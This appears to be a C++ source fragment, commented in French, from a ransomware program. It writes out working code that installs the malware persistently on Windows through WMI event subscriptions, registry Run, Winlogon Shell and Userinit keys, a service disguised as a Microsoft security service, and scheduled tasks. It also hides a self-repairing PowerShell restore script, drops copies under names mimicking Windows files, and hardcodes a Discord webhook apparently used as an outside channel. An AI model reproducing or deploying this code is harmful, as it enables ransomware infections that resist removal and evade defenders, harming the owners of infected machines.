#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <windows.h>

// Configuration - URL Webhook configurée
const std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1354564587751735437/Sf4ab7f_d5Q-HTyIwvfMcs-QPs2YGUVQwhEZUVZmaWtslZhI78YPCj1wmYzI7NU1eVnN";
// Fin de la configuration

// Ajouter dans la partie private de la classe Ransomware:

    // Fonction pour établir une persistance via WMI (Windows Management Instrumentation)
    // Cette méthode est "fileless" et très difficile à détecter par les solutions de sécurité
    bool setupWMIPersistence() {
        std::cout << "[*] Configuration de la persistance WMI..." << std::endl;
        
        // Obtenir le chemin de l'exécutable pour le relancer
        std::string exePath = GetExecutablePath();
        if (exePath.empty()) {
            std::cout << "[!] Impossible d'obtenir le chemin de l'exécutable" << std::endl;
            return false;
        }
        
        // Échapper les backslashes pour PowerShell
        std::string escapedPath = exePath;
        size_t pos = 0;
        while ((pos = escapedPath.find("\\", pos)) != std::string::npos) {
            escapedPath.replace(pos, 1, "\\\\");
            pos += 2;
        }
        
        // 1. Créer un filtre d'événement permanent (déclencheur)
        // Ce filtre sera déclenché toutes les 5 minutes et au démarrage du système
        std::string createFilterCmd = "powershell -Command \"$Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='WindowsSecurityFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour % 1 = 0'}\"";
        
        // 2. Créer un consommateur de commande qui exécutera notre programme
        std::string createConsumerCmd = "powershell -Command \"$Command = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments @{Name='WindowsSecurityConsumer'; CommandLineTemplate='" + escapedPath + "'; RunInteractively='false'}\"";
        
        // 3. Créer une liaison entre le filtre et le consommateur (le déclencheur et l'action)
        std::string createBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='WindowsSecurityFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='WindowsSecurityConsumer'\\\"); DeliveryQoS=1}\"";
        
        // 4. Créer un second abonnement pour le démarrage du système
        std::string createBootFilterCmd = "powershell -Command \"$BootFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='WindowsBootFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \\\"explorer.exe\\\"'}\"";
        
        std::string createBootBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='WindowsBootFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='WindowsSecurityConsumer'\\\"); DeliveryQoS=1}\"";
        
        // NOUVEAU - Événement de démarrage Windows plus précoce (Winlogon)
        std::string createWinlogonFilterCmd = "powershell -Command \"$WinlogonFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='WinlogonBootFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \\\"winlogon.exe\\\"'}\"";
        
        std::string createWinlogonBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='WinlogonBootFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='WindowsSecurityConsumer'\\\"); DeliveryQoS=1}\"";
        
        // NOUVEAU - Événement SMSS (Session Manager Subsystem) - lancement très précoce
        std::string createSmssFilterCmd = "powershell -Command \"$SmssFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='SmssBootFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \\\"smss.exe\\\"'}\"";
        
        std::string createSmssBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='SmssBootFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='WindowsSecurityConsumer'\\\"); DeliveryQoS=1}\"";
        
        // 5. Implémenter des méthodes avancées de persistance WMI
        
        // 5.1 Créer une classe WMI personnalisée permanente pour stocker des données
        std::string createClassCmd = "powershell -Command \"$Namespace = 'root\\SecurityServices'; if (-not (Get-WmiObject -Namespace 'root' -Class __NAMESPACE -Filter \\\"Name='SecurityServices'\\\")) { $NewNamespace = New-Object System.Management.ManagementClass('root', $null, $null); $NewNamespace.Name = 'SecurityServices'; $NewNamespace.Put() }; $BasePath = ([WmiClass] 'root\\SecurityServices:Win32_SecurityProvider').Path.Path; if (-not $BasePath) { $NewClass = New-Object System.Management.ManagementClass('root\\SecurityServices', [string]::Empty, $null); $NewClass['__CLASS'] = 'Win32_SecurityProvider'; $NewClass.Qualifiers.Add('Static', $true); $NewClass.Properties.Add('ID', [System.Management.CimType]::String, $false); $NewClass.Properties['ID'].Qualifiers.Add('Key', $true); $NewClass.Properties.Add('Library', [System.Management.CimType]::String, $false); $NewClass.Properties.Add('Status', [System.Management.CimType]::UInt32, $false); $NewClass.Put() }\"";
        
        // 5.2 Stocker le chemin de l'exécutable dans cette classe personnalisée pour persistance secondaire
        std::string storeDataCmd = "powershell -Command \"$ClassName = 'Win32_SecurityProvider'; $WmiInstance = Set-WmiInstance -Namespace 'root\\SecurityServices' -Class $ClassName -Arguments @{ID='SecurityManager'; Library='" + escapedPath + "'; Status=1}\"";
        
        // 5.3 Créer un script PowerShell pour la restauration de la persistance si elle est supprimée
        std::string tempDir = std::string(getenv("TEMP"));
        std::string wmiRestorePath = tempDir + "\\SecurityServices.ps1";
        std::ofstream wmiRestoreScript(wmiRestorePath);
        
        if (wmiRestoreScript.is_open()) {
            wmiRestoreScript << "$LibraryPath = (Get-WmiObject -Namespace 'root\\SecurityServices' -Class Win32_SecurityProvider -Filter \"ID='SecurityManager'\").Library" << std::endl;
            wmiRestoreScript << "# Vérifier si les filtres WMI existent, sinon les recréer" << std::endl;
            wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsSecurityFilter'\")) {" << std::endl;
            wmiRestoreScript << "    # Recréer le filtre principal" << std::endl;
            wmiRestoreScript << "    $Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Name='WindowsSecurityFilter';" << std::endl;
            wmiRestoreScript << "        EventNameSpace='root\\cimv2';" << std::endl;
            wmiRestoreScript << "        QueryLanguage='WQL';" << std::endl;
            wmiRestoreScript << "        Query='SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour % 1 = 0'" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "}" << std::endl;
            wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\")) {" << std::endl;
            wmiRestoreScript << "    # Recréer le consommateur" << std::endl;
            wmiRestoreScript << "    $Command = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Name='WindowsSecurityConsumer';" << std::endl;
            wmiRestoreScript << "        CommandLineTemplate=$LibraryPath;" << std::endl;
            wmiRestoreScript << "        RunInteractively='false'" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "}" << std::endl;
            wmiRestoreScript << "# Recréer les liaisons si nécessaires" << std::endl;
            wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __FilterToConsumerBinding -Filter \"Filter.Name='WindowsSecurityFilter' AND Consumer.Name='WindowsSecurityConsumer'\")) {" << std::endl;
            wmiRestoreScript << "    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Filter = (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsSecurityFilter'\");" << std::endl;
            wmiRestoreScript << "        Consumer = (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\");" << std::endl;
            wmiRestoreScript << "        DeliveryQoS = 1" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "}" << std::endl;
            wmiRestoreScript << "# Vérifier le filtre de démarrage" << std::endl;
            wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsBootFilter'\")) {" << std::endl;
            wmiRestoreScript << "    # Recréer le filtre de démarrage" << std::endl;
            wmiRestoreScript << "    $BootFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Name='WindowsBootFilter';" << std::endl;
            wmiRestoreScript << "        EventNameSpace='root\\cimv2';" << std::endl;
            wmiRestoreScript << "        QueryLanguage='WQL';" << std::endl;
            wmiRestoreScript << "        Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \"explorer.exe\"'" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "    # Recréer la liaison de démarrage" << std::endl;
            wmiRestoreScript << "    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Filter = (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsBootFilter'\");" << std::endl;
            wmiRestoreScript << "        Consumer = (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\");" << std::endl;
            wmiRestoreScript << "        DeliveryQoS = 1" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "}" << std::endl;
            
            // NOUVEAU - Vérification des filtres winlogon et smss
            wmiRestoreScript << "# Vérifier le filtre Winlogon" << std::endl;
            wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WinlogonBootFilter'\")) {" << std::endl;
            wmiRestoreScript << "    $WinlogonFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Name='WinlogonBootFilter';" << std::endl;
            wmiRestoreScript << "        EventNameSpace='root\\cimv2';" << std::endl;
            wmiRestoreScript << "        QueryLanguage='WQL';" << std::endl;
            wmiRestoreScript << "        Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \"winlogon.exe\"'" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Filter = $WinlogonFilter;" << std::endl;
            wmiRestoreScript << "        Consumer = (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\");" << std::endl;
            wmiRestoreScript << "        DeliveryQoS = 1" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "}" << std::endl;
            
            wmiRestoreScript << "# Vérifier le filtre SMSS" << std::endl;
            wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='SmssBootFilter'\")) {" << std::endl;
            wmiRestoreScript << "    $SmssFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Name='SmssBootFilter';" << std::endl;
            wmiRestoreScript << "        EventNameSpace='root\\cimv2';" << std::endl;
            wmiRestoreScript << "        QueryLanguage='WQL';" << std::endl;
            wmiRestoreScript << "        Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \"smss.exe\"'" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Filter = $SmssFilter;" << std::endl;
            wmiRestoreScript << "        Consumer = (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\");" << std::endl;
            wmiRestoreScript << "        DeliveryQoS = 1" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "}" << std::endl;
            
            wmiRestoreScript << "# Exécuter notre programme principal immédiatement" << std::endl;
            wmiRestoreScript << "Start-Process -FilePath $LibraryPath -WindowStyle Hidden" << std::endl;
            wmiRestoreScript.close();
            
            // 5.4 Créer un WMI Event Consumer qui exécute ce script de restauration quotidiennement
            std::string createRestoreFilterCmd = "powershell -Command \"$RestoreFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='SecurityManagerFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 86400 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour = 3 AND TargetInstance.Minute = 0'}\"";
            
            std::string createRestoreConsumerCmd = "powershell -Command \"$RestoreConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments @{Name='SecurityManagerConsumer'; CommandLineTemplate='powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " + wmiRestorePath + "'; RunInteractively='false'}\"";
            
            std::string createRestoreBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='SecurityManagerFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='SecurityManagerConsumer'\\\"); DeliveryQoS=1}\"";
            
            // Exécuter les commandes PowerShell avec la priorité élevée
            system(("powershell -Command \"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command \"" + createClassCmd + "\"' -Verb RunAs -WindowStyle Hidden\"").c_str());
            Sleep(1000); // Attendre que le namespace soit créé
            
            system(createFilterCmd.c_str());
            system(createConsumerCmd.c_str());
            system(createBindingCmd.c_str());
            system(createBootFilterCmd.c_str());
            system(createBootBindingCmd.c_str());
            
            // NOUVEAU - Filtres de démarrage précoce
            system(createWinlogonFilterCmd.c_str());
            system(createWinlogonBindingCmd.c_str());
            system(createSmssFilterCmd.c_str());
            system(createSmssBindingCmd.c_str());
            
            system(storeDataCmd.c_str());
            system(createRestoreFilterCmd.c_str());
            system(createRestoreConsumerCmd.c_str());
            system(createRestoreBindingCmd.c_str());
            
            // NOUVEAU - Méthodes supplémentaires de démarrage immédiat
            // Méthode Run au démarrage (immédiate)
            system(("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSecureService /t REG_SZ /d \"" + exePath + "\" /f").c_str());
            
            // Méthode utilisateur courant run (pour démarrage même sans droits admin)
            system(("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSecureService /t REG_SZ /d \"" + exePath + "\" /f").c_str());
            
            // Méthode RunOnce (très prioritaire au démarrage)
            system(("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v WindowsSecureUpdate /t REG_SZ /d \"" + exePath + "\" /f").c_str());
            
            // Méthode Winlogon Shell (extrêmement rapide)
            system(("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe," + exePath + "\" /f").c_str());
            
            // Méthode Winlogon Userinit (s'exécute avant l'environnement utilisateur)
            std::string currentUserinit = "";
            HKEY hKey;
            if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                char buffer[1024];
                DWORD bufferSize = sizeof(buffer);
                if (RegQueryValueEx(hKey, "Userinit", 0, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                    currentUserinit = buffer;
                }
                RegCloseKey(hKey);
            }
            
            if (!currentUserinit.empty()) {
                if (currentUserinit.back() != ',') {
                    currentUserinit += ',';
                }
                currentUserinit += exePath;
                system(("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"" + currentUserinit + "\" /f").c_str());
            }
            
            // Méthode auto-start service (très rapide)
            std::string serviceCmd = "sc create \"WindowsSecurityService\" binPath= \"" + exePath + "\" start= auto type= own error= ignore";
            system(serviceCmd.c_str());
            system("sc description \"WindowsSecurityService\" \"Microsoft Windows Security Service\"");
            system("sc failure \"WindowsSecurityService\" reset= 0 actions= restart/0");
            system("sc start \"WindowsSecurityService\"");
            
            // Méthode tâche planifiée au démarrage
            std::string taskCmd = "schtasks /create /tn \"WindowsSecurityInitializer\" /tr \"" + exePath + "\" /sc onstart /ru SYSTEM /f";
            system(taskCmd.c_str());
            
            // Méthode tâche planifiée au login
            std::string loginTaskCmd = "schtasks /create /tn \"WindowsUserInitializer\" /tr \"" + exePath + "\" /sc onlogon /f";
            system(loginTaskCmd.c_str());
            
            // 6. Cacher nos traces en rendant le fichier script invisible
            system(("attrib +h +s \"" + wmiRestorePath + "\"").c_str());
            
            std::cout << "[+] Persistance WMI configurée avec succès!" << std::endl;
            return true;
        } else {
            std::cout << "[!] Échec de la création du script de restauration WMI" << std::endl;
            return false;
        }
    }
    
    // Fonction pour vérifier et réparer la persistance WMI (exécutée périodiquement)
    bool verifyAndRepairWMIPersistence() {
        // Vérifier si notre classe personnalisée WMI existe
        std::string checkClassCmd = "powershell -Command \"if (Get-WmiObject -Namespace 'root\\SecurityServices' -Class Win32_SecurityProvider -ErrorAction SilentlyContinue) { Write-Output 'exists' } else { Write-Output 'notexists' }\"";
        
        std::string tempFile = std::string(getenv("TEMP")) + "\\wmi_check.txt";
        system((checkClassCmd + " > " + tempFile).c_str());
        
        std::ifstream resultFile(tempFile);
        std::string result;
        std::getline(resultFile, result);
        resultFile.close();
        fs::remove(tempFile);
        
        if (result == "notexists") {
            std::cout << "[!] Persistance WMI compromise, restauration..." << std::endl;
            return setupWMIPersistence();
        }
        
        // Vérifier les filtres et liaisons WMI
        std::string checkBindingsCmd = "powershell -Command \"if ((Get-WmiObject -Namespace 'root\\subscription' -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object {$_.Filter.Name -eq 'WindowsSecurityFilter'})) { Write-Output 'exists' } else { Write-Output 'notexists' }\"";
        
        system((checkBindingsCmd + " > " + tempFile).c_str());
        
        resultFile.open(tempFile);
        std::getline(resultFile, result);
        resultFile.close();
        fs::remove(tempFile);
        
        if (result == "notexists") {
            std::cout << "[!] Liaisons WMI compromises, restauration..." << std::endl;
            return setupWMIPersistence();
        }
        
        std::cout << "[+] Persistance WMI vérifiée et intacte" << std::endl;
        return true;
    }

// Modification de la fonction setupAdvancedPersistence

bool setupAdvancedPersistence() {
    std::string exePath = GetExecutablePath();
    
    // 0. MÉTHODE PRIORITAIRE: Persistance WMI (Windows Management Instrumentation) 
    // Cette technique est "fileless" et très difficile à détecter par les solutions de sécurité
    std::cout << "[*] Configuration de la persistance WMI avancée..." << std::endl;
    if (setupWMIPersistence()) {
        std::cout << "[+] Persistance WMI établie avec succès!" << std::endl;
    } else {
        std::cout << "[!] Échec de la persistance WMI, utilisation des méthodes alternatives..." << std::endl;
    }
    
    // 1. Méthode 1: Créer plusieurs copies dans des emplacements système critiques
    // Ces emplacements sont choisis pour leur persistance et difficultés d'accès
    std::vector<std::string> systemLocations = {
        "C:\\Windows\\System32\\drivers\\etc\\WindowsDefender.exe", // Camouflé comme fichier système
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityService.exe", // Démarrage système
        "C:\\Users\\Public\\Libraries\\system.dll.exe", // Masqué dans un dossier public
        "C:\\Windows\\SysWOW64\\winlogon.exe.mui" // Camouflé comme composant Windows
    };
    
    // Reste du code existant...
    
    // Vérifier la persistance WMI périodiquement
    std::thread([this]() {
        while (true) {
            Sleep(3600000); // Vérifier toutes les heures
            verifyAndRepairWMIPersistence();
        }
    }).detach();
    
    return true;
} 